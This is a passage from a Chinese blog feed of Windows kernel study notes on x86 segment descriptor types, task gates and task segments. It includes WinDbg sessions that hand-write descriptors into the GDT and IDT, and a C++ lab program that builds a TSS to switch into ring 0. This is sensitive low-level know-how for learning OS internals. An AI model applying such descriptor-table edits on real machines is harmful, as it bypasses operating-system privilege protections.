class="number">804093b</span>9`b0004fff <span class="number">0040f</span>300`<span class="number">00000f</span>ff</span><br><span class="line"><span class="number">80b</span>98840  <span class="number">0000f</span>200`<span class="number">0400f</span>fff <span class="number">00</span>cff300`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98850  <span class="number">800089b</span>9`ad200067 <span class="number">800089b</span>9`acb00067</span><br><span class="line"><span class="number">80b</span>98860  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">80b</span>98870  <span class="number">800092b</span>9`<span class="number">880003f</span>f <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></table></figure><h2 id="TYPE域知识点"><a href="#TYPE域知识点" class="headerlink" title="TYPE域知识点"></a>TYPE域知识点</h2><blockquote><p>当段描述符中S标志（描述符类型）为1时, 描述符为代码段描述符或者数据段描述符。类型域的最高位（段描述符的第二个双字的第11位）将决定该描述符为数据段描述符（为0）还是代码段描述符（为1）。</p></blockquote><blockquote><p>代码和数据段描述类型</p></blockquote><blockquote><p>对于数据段而言, 描述符的类型域的低3位（第8、9、10位）被解释为访问控制（A）、是否可写（W）、扩展方向（E）。数据段可以是只读或者可读写的段, 这取决于”是否可写”的标志。</p></blockquote><blockquote><p>堆栈段必须是可读写的数据段。将一个不可写的数据段的选择子置入SS寄存器会导致一般保护异常（#GP）。如果堆栈段的大小需要动态变化, 可以将其置为向下扩展数据段（扩展方向标志为1）。这里, 动态改变段界限将导致栈空间朝着栈底部空间扩展。如果栈的长度保持不变, 堆栈段可以是向上扩展的, 也可以是向下扩展的。</p></blockquote><blockquote><p>访问位表示自最后一次被操作系统清零后, 段是否被访问过。每当处理器将段的段选择子置入段寄存器时, 就将访问位置为1。该位一直保持1直到被显式清零。该位可以用于虚拟内存管理和测试。</p></blockquote><blockquote><p>对于代码段而言, 类型域的低3位被解释为访问位（A）、可读位（R）、一致位（C）。根据可读位的设置, 代码段可以为”只执行”或者”可执行可读”。当有常量或者其它静态数据与指令代码一起在ROM中时, 必须使用”可执行可读”的段。要从代码段读取数据, 可以通过带有CS前缀的指令或者将代码段选择子置入数目段寄存器（DS、ES、FS或者GS）。在保护模式下, 代码段是不可写的。</p></blockquote><blockquote><p>代码段可以是一致性的, 也可以是不一致性的。转入一个特权级更高的一致性段的进程可以在当前特权级继续执行下去。除非使用了调用门或者任务门, 否则, 转入一个不同特权级的非一致性段将使处理器产生一个”一般保护异常”（#GP）。不访问受保护程序的系统程序和某些类型的异常处理程序（比如除法错误或者溢出）可以被载入一致性的代码段。不能被特权级更低的程序和过程访问的程序应该被载入非一致性的代码段。</p></blockquote><div class="note bug"><p><strong>注意</strong></p><p>无论目标段是否为一致性代码段, 进程都不能因为<code>call</code>或<code>jump</code>而转入一个特权级较低（特权值较大）的代码段执行。试图进行这样的执行转换将导致一个一般保护异常（#GP）;</p></div><blockquote><p>所有数据段都是非一致性的, 这就意味着数据段不能被更低特权级的进程访问（特权级数值较大的执行代码）。然而, 和代码段不同, 数据段可以被更高优先级的程序或过程（特权级数值较小的执行代码）访问, 不需要使用特别的访问门.</p></blockquote><blockquote><p>如果GDT或者LDT中的段描述符被放置在ROM中, 当程序或者处理器试图更改在ROM中的段描述符时, 处理器将进入一个死循环。为了防止此类问题的发生, 可以将所有放置在ROM中的段描述符设置访问位。同时, 删除所有操作系统代码中试图更改放置在ROM中的段描述符的代码。</p></blockquote><h2 id="段控制内存访问方向知识点"><a href="#段控制内存访问方向知识点" class="headerlink" title="段控制内存访问方向知识点"></a>段控制内存访问方向知识点</h2><h3 id="代码实验-2"><a href="#代码实验-2" class="headerlink" title="代码实验"></a>代码实验</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 修改gdtr中0x48位置为00cff600`0000ffff（type域为6表示读/写, 内存向下扩展）</span></span><br><span class="line">kd&gt; eq <span class="number">80b</span>98848 <span class="number">00</span>cff600`<span class="number">0000f</span>fff</span><br><span class="line">WriteVirtual: <span class="number">80b</span>98848 <span class="keyword">not</span> properly sign extended</span><br><span class="line">kd&gt; dq <span class="number">80b</span>98800</span><br><span class="line">ReadVirtual: <span class="number">80b</span>98800 <span class="keyword">not</span> properly sign extended</span><br><span class="line"><span class="number">80b</span>98800  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00</span>cf9b00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98810  <span class="number">00</span>cf9300`<span class="number">0000f</span>fff <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98820  <span class="number">00</span>cff300`<span class="number">0000f</span>fff <span class="number">80008b</span>b9`<span class="number">8</span>c0020ab</span><br><span class="line"><span class="number">80b</span>98830  <span class="number">804093b</span>9`b0004fff <span class="number">0040f</span>300`<span class="number">00000f</span>ff</span><br><span class="line"><span class="number">80b</span>98840  <span class="number">0000f</span>200`<span class="number">0400f</span>fff <span class="number">00</span>cff600`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98850  <span class="number">800089b</span>9`ad200067 <span class="number">800089b</span>9`acb00067</span><br><span class="line"><span class="number">80b</span>98860  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">80b</span>98870  <span class="number">800092b</span>9`<span class="number">880003f</span>f <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="comment">// 2. 修改ds寄存器</span></span><br><span class="line">mov ax, <span class="number">0x48</span>;</span><br><span class="line">mov ds, ax;</span><br><span class="line"><span class="comment">// 运行将产生异常, 将Limit和Base修改成0进行修复（0c0f600`00000000）</span></span><br></pre></td></tr></table></figure><div class="note bug"><p><strong></strong></p><ul><li>非一致代码段: 应用层不能调用内核层代码;</li><li>一致代码段: 应用层可以直接调用CS描述的一致代码段;</li></ul></div>]]></content>
      
      
      <categories>
          
          <category> Windows内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核-任务门</title>
      <link href="/9144b229.html"/>
      <url>/9144b229.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>任务门</strong></p></div><span id="more"></span><h2 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h2><p>00407030 -&gt; 0000e940&#96;70300068</p><p>GDT: eq 80b98848 0000e940<code>70300068 IDT: eq 80b98100 0000e500</code>00480000</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="INT-8双重异常"><a href="#INT-8双重异常" class="headerlink" title="INT 8双重异常"></a>INT 8双重异常</h3><h3 id="代码实验"><a href="#代码实验" class="headerlink" title="代码实验"></a>代码实验</h3><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 09_28_TaskGate(任务门).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 任务门</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//0x2024 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_KiIoAccessMap</span></span><br><span class="line">&#123;</span><br><span class="line">UCHAR DirectionMap[<span class="number">32</span>];                                                 <span class="comment">//0x0</span></span><br><span class="line">UCHAR IoMap[<span class="number">8196</span>];                                                      <span class="comment">//0x20</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//0x20ac bytes (sizeof)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_KTSS</span></span><br><span class="line">&#123;</span><br><span class="line">USHORT Backlink;                                                        <span class="comment">//0x0</span></span><br><span class="line">USHORT Reserved0;                                                       <span class="comment">//0x2</span></span><br><span class="line">ULONG Esp0;                                                             <span class="comment">//0x4</span></span><br><span class="line">USHORT Ss0;                                                             <span class="comment">//0x8</span></span><br><span class="line">USHORT Reserved1;                                                       <span class="comment">//0xa</span></span><br><span class="line">ULONG NotUsed1[<span class="number">4</span>];                                                      <span class="comment">//0xc</span></span><br><span class="line">ULONG CR3;                                                              <span class="comment">//0x1c</span></span><br><span class="line">ULONG Eip;                                                              <span class="comment">//0x20</span></span><br><span class="line">ULONG EFlags;                                                           <span class="comment">//0x24</span></span><br><span class="line">ULONG Eax;                                                              <span class="comment">//0x28</span></span><br><span class="line">ULONG Ecx;                                                              <span class="comment">//0x2c</span></span><br><span class="line">ULONG Edx;                                                              <span class="comment">//0x30</span></span><br><span class="line">ULONG Ebx;                                                              <span class="comment">//0x34</span></span><br><span class="line">ULONG Esp;                                                              <span class="comment">//0x38</span></span><br><span class="line">ULONG Ebp;                                                              <span class="comment">//0x3c</span></span><br><span class="line">ULONG Esi;                                                              <span class="comment">//0x40</span></span><br><span class="line">ULONG Edi;                                                              <span class="comment">//0x44</span></span><br><span class="line">USHORT Es;                                                              <span class="comment">//0x48</span></span><br><span class="line">USHORT Reserved2;                                                       <span class="comment">//0x4a</span></span><br><span class="line">USHORT Cs;                                                              <span class="comment">//0x4c</span></span><br><span class="line">USHORT Reserved3;                                                       <span class="comment">//0x4e</span></span><br><span class="line">USHORT Ss;                                                              <span class="comment">//0x50</span></span><br><span class="line">USHORT Reserved4;                                                       <span class="comment">//0x52</span></span><br><span class="line">USHORT Ds;                                                              <span class="comment">//0x54</span></span><br><span class="line">USHORT Reserved5;                                                       <span class="comment">//0x56</span></span><br><span class="line">USHORT Fs;                                                              <span class="comment">//0x58</span></span><br><span class="line">USHORT Reserved6;                                                       <span class="comment">//0x5a</span></span><br><span class="line">USHORT Gs;                                                              <span class="comment">//0x5c</span></span><br><span class="line">USHORT Reserved7;                                                       <span class="comment">//0x5e</span></span><br><span class="line">USHORT LDT;                                                             <span class="comment">//0x60</span></span><br><span class="line">USHORT Reserved8;                                                       <span class="comment">//0x62</span></span><br><span class="line">USHORT Flags;                                                           <span class="comment">//0x64</span></span><br><span class="line">USHORT IoMapBase;                                                       <span class="comment">//0x66</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_KiIoAccessMap</span> IoMaps[<span class="number">1</span>];                                        <span class="comment">//0x68</span></span><br><span class="line">UCHAR IntDirectionMap[<span class="number">32</span>];                                              <span class="comment">//0x208c</span></span><br><span class="line">&#125;KTSS;</span><br><span class="line"></span><br><span class="line">KTSS tss = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> bufEsp0[<span class="number">0x2000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> bufEsp3[<span class="number">0x2000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __declspec(naked) <span class="built_in">test</span>()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> <span class="number">3</span>;</span><br><span class="line">pushfd;</span><br><span class="line">pop eax;</span><br><span class="line"><span class="keyword">or</span> eax, <span class="number">0x4000</span>;</span><br><span class="line">push eax;</span><br><span class="line">popfd;</span><br><span class="line">iretd;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(bufEsp0, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line"><span class="built_in">memset</span>(bufEsp3, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line">tss.Esp0 = (ULONG)bufEsp0 + <span class="number">0x1FF0</span>;</span><br><span class="line">tss.Esp = (ULONG)bufEsp3 + <span class="number">0x1FF0</span>;</span><br><span class="line">tss.Ss0 = <span class="number">0x10</span>;</span><br><span class="line">tss.Ss = <span class="number">0x10</span>;</span><br><span class="line">tss.Cs = <span class="number">0x8</span>;</span><br><span class="line">tss.Ds = <span class="number">0x23</span>;</span><br><span class="line">tss.Es = <span class="number">0x23</span>;</span><br><span class="line">tss.Fs = <span class="number">0x30</span>;</span><br><span class="line">tss.EFlags = <span class="number">2</span>;</span><br><span class="line">tss.Eip = (ULONG)test;</span><br><span class="line">tss.IoMapBase = <span class="number">0x20ac</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入你的CR3: &quot;</span>);</span><br><span class="line">DWORD dwCr3 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf_s</span>(<span class="string">&quot;%x&quot;</span>, &amp;dwCr3);</span><br><span class="line"></span><br><span class="line">tss.CR3 = dwCr3;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, &amp;tss);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bufCode[<span class="number">6</span>] = &#123; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// call fword ptr bufCode;</span></span><br><span class="line"><span class="type">int</span> <span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核-任务段</title>
      <link href="/f79a1477.html"/>
      <url>/f79a1477.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>任务段</strong></p></div><span id="more"></span><h2 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h2><ul><li>在程序中获取到<code>tss</code>的地址, 例如: <code>00407030</code>; </li><li>拼接段描述符: <strong>0000e940&#96;703020ac</strong>;</li><li>修改<code>GDTR</code>中段描述符;</li></ul><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="KTSS结构体"><a href="#KTSS结构体" class="headerlink" title="_KTSS结构体"></a>_KTSS结构体</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// _KTSS 结构原形</span></span><br><span class="line">ntdll!_KTSS</span><br><span class="line">   +<span class="number">0x000</span> Backlink         : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> Reserved0        : Uint2B</span><br><span class="line">   +<span class="number">0x004</span> Esp0             : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> Ss0              : Uint2B</span><br><span class="line">   +<span class="number">0x00a</span> Reserved1        : Uint2B</span><br><span class="line">   +<span class="number">0x00c</span> NotUsed1         : [<span class="number">4</span>] Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> CR3              : Uint4B</span><br><span class="line">   +<span class="number">0x020</span> Eip              : Uint4B</span><br><span class="line">   +<span class="number">0x024</span> EFlags           : Uint4B</span><br><span class="line">   +<span class="number">0x028</span> Eax              : Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> Ecx              : Uint4B</span><br><span class="line">   +<span class="number">0x030</span> Edx              : Uint4B</span><br><span class="line">   +<span class="number">0x034</span> Ebx              : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> Esp              : Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> Ebp              : Uint4B</span><br><span class="line">   +<span class="number">0x040</span> Esi              : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> Edi              : Uint4B</span><br><span class="line">   +<span class="number">0x048</span> Es               : Uint2B</span><br><span class="line">   +<span class="number">0x04a</span> Reserved2        : Uint2B</span><br><span class="line">   +<span class="number">0x04c</span> Cs               : Uint2B</span><br><span class="line">   +<span class="number">0x04e</span> Reserved3        : Uint2B</span><br><span class="line">   +<span class="number">0x050</span> Ss               : Uint2B</span><br><span class="line">   +<span class="number">0x052</span> Reserved4        : Uint2B</span><br><span class="line">   +<span class="number">0x054</span> Ds               : Uint2B</span><br><span class="line">   +<span class="number">0x056</span> Reserved5        : Uint2B</span><br><span class="line">   +<span class="number">0x058</span> Fs               : Uint2B</span><br><span class="line">   +<span class="number">0x05a</span> Reserved6        : Uint2B</span><br><span class="line">   +<span class="number">0x05c</span> Gs               : Uint2B</span><br><span class="line">   +<span class="number">0x05e</span> Reserved7        : Uint2B</span><br><span class="line">   +<span class="number">0x060</span> LDT              : Uint2B</span><br><span class="line">   +<span class="number">0x062</span> Reserved8        : Uint2B</span><br><span class="line">   +<span class="number">0x064</span> Flags            : Uint2B</span><br><span class="line">   +<span class="number">0x066</span> IoMapBase        : Uint2B</span><br><span class="line">   +<span class="number">0x068</span> IoMaps           : [<span class="number">1</span>] _KiIoAccessMap</span><br><span class="line">   +<span class="number">0x208c</span> IntDirectionMap  : [<span class="number">32</span>] UChar</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="代码实验"><a href="#代码实验" class="headerlink" title="代码实验"></a>代码实验</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当输入CR3后进入0环断点后的各种情况</span></span><br><span class="line">kd&gt; r tr</span><br><span class="line">tr=<span class="number">00000048</span>         <span class="comment">// 当前tr寄存器已改变为0x48, 之前为0x28</span></span><br><span class="line">kd&gt; dg <span class="number">28</span></span><br><span class="line">                                  P Si Gr Pr Lo</span><br><span class="line">Sel    Base     Limit     Type    l ze an es ng Flags</span><br><span class="line">---- -------- -------- ---------- - -- -- -- -- --------</span><br><span class="line"><span class="number">0028</span> <span class="number">80b</span>98c00 <span class="number">000020</span>ab TSS32 Busy <span class="number">0</span> Nb By P  Nl <span class="number">0000008b</span></span><br><span class="line">kd&gt; dt _KTSS <span class="number">80b</span>98c00</span><br><span class="line">ntdll!_KTSS</span><br><span class="line">   +<span class="number">0x000</span> Backlink         : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x002</span> Reserved0        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x004</span> Esp0             : <span class="number">0xad01fcb0</span></span><br><span class="line">   +<span class="number">0x008</span> Ss0              : <span class="number">0x10</span></span><br><span class="line">   +<span class="number">0x00a</span> Reserved1        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x00c</span> NotUsed1         : [<span class="number">4</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x01c</span> CR3              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x020</span> Eip              : <span class="number">0x401364</span></span><br><span class="line">   +<span class="number">0x024</span> EFlags           : <span class="number">0x246</span></span><br><span class="line">   +<span class="number">0x028</span> Eax              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x02c</span> Ecx              : <span class="number">0xfde7b46e</span></span><br><span class="line">   +<span class="number">0x030</span> Edx              : <span class="number">0x270178</span></span><br><span class="line">   +<span class="number">0x034</span> Ebx              : <span class="number">0x7ffd6000</span></span><br><span class="line">   +<span class="number">0x038</span> Esp              : <span class="number">0x12fe04</span></span><br><span class="line">   +<span class="number">0x03c</span> Ebp              : <span class="number">0x12ff08</span></span><br><span class="line">   +<span class="number">0x040</span> Esi              : <span class="number">0x12fe04</span></span><br><span class="line">   +<span class="number">0x044</span> Edi              : <span class="number">0x12ff08</span></span><br><span class="line">   +<span class="number">0x048</span> Es               : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x04a</span> Reserved2        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x04c</span> Cs               : <span class="number">0x1b</span></span><br><span class="line">   +<span class="number">0x04e</span> Reserved3        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x050</span> Ss               : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x052</span> Reserved4        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x054</span> Ds               : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x056</span> Reserved5        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x058</span> Fs               : <span class="number">0x3b</span></span><br><span class="line">   +<span class="number">0x05a</span> Reserved6        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x05c</span> Gs               : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x05e</span> Reserved7        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x060</span> LDT              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x062</span> Reserved8        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x064</span> Flags            : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x066</span> IoMapBase        : <span class="number">0x20ac</span></span><br><span class="line">   +<span class="number">0x068</span> IoMaps           : [<span class="number">1</span>] _KiIoAccessMap</span><br><span class="line">   +<span class="number">0x208c</span> IntDirectionMap  : [<span class="number">32</span>]  <span class="string">&quot;???&quot;</span></span><br><span class="line">kd&gt; u <span class="number">0x401364</span></span><br><span class="line"><span class="number">00401364</span> cc              <span class="type">int</span>     <span class="number">3</span></span><br><span class="line"><span class="number">00401365</span> c0528bcd        rcl     byte ptr [edx<span class="number">-75</span>h],<span class="number">0</span>CDh</span><br><span class="line"><span class="number">00401369</span> <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">0040136</span>a <span class="number">8</span>d1598134000    lea     edx,ds:[<span class="number">401398</span>h]</span><br><span class="line"><span class="number">00401370</span> e87b020000      call    <span class="number">004015f</span>0</span><br><span class="line"><span class="number">00401375</span> <span class="number">58</span>              pop     eax</span><br><span class="line"><span class="number">00401376</span> <span class="number">5</span>a              pop     edx</span><br><span class="line"><span class="number">00401377</span> <span class="number">5f</span>              pop     edi</span><br><span class="line">kd&gt; dg <span class="number">48</span></span><br><span class="line">                                  P Si Gr Pr Lo</span><br><span class="line">Sel    Base     Limit     Type    l ze an es ng Flags</span><br><span class="line">---- -------- -------- ---------- - -- -- -- -- --------</span><br><span class="line"><span class="number">0048</span> <span class="number">00407030</span> <span class="number">00000100</span> TSS32 Busy <span class="number">3</span> Nb By P  Nl <span class="number">000000</span>eb</span><br><span class="line">kd&gt; dt _KTSS <span class="number">00407030</span></span><br><span class="line">ntdll!_KTSS</span><br><span class="line">   +<span class="number">0x000</span> Backlink         : <span 